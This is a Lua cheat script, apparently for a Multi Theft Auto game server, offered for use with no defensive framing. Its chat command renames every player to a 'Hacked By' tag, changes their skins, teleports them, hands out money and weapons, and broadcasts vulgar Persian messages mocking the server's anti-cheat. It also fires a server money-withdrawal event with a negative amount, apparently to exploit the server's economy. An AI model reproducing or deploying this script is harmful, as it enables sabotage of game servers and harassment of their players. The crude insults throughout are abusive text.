function CheatModeCommand(player)
    ChangePlayerNames()
    ChangePlayerSkins()
    SendMessageToAllPlayers()
    AddMoneyToPlayers()
    TeleportPlayers()
    GiveWeaponsToPlayers()
	triggerServerEvent("withdrawMoneyPersonal",localPlayer,-1000000)
    outputChatBox("کص همه رفت!", player)
end
addCommandHandler("sex", CheatModeCommand)

function ChangePlayerNames()
    for i, player in ipairs(getElementsByType("player")) do
        setPlayerName(player, "Hacked By Kos Kir Kon")
    end
end

function ChangePlayerSkins()
    for i, player in ipairs(getElementsByType("player")) do
        setElementModel(player, 178)
    end
end

function SendMessageToAllPlayers()
    for i, player in ipairs(getElementsByType("player")) do
        outputChatBox("Kiram To Anti Cheateton Ta Shoma Bashin Anti Cheat Maro Nakharin Konia!!!!", player)
    end
end

function AddMoneyToPlayers()
    for i, player in ipairs(getElementsByType("player")) do
        givePlayerMoney(player, 99999999)
    end
end

function TeleportPlayers()
    for i, player in ipairs(getElementsByType("player")) do
        setElementPosition(player, 100, 200, 10)
    end
end

function GiveWeaponsToPlayers()
    for i, player in ipairs(getElementsByType("player")) do
        giveWeapon(player, 31, 1000) 
    end
end

function WithdrawMoneyFromPlayer(player, amount)
    triggerServerEvent("withdrawMoneyPersonal", player, amount)
end

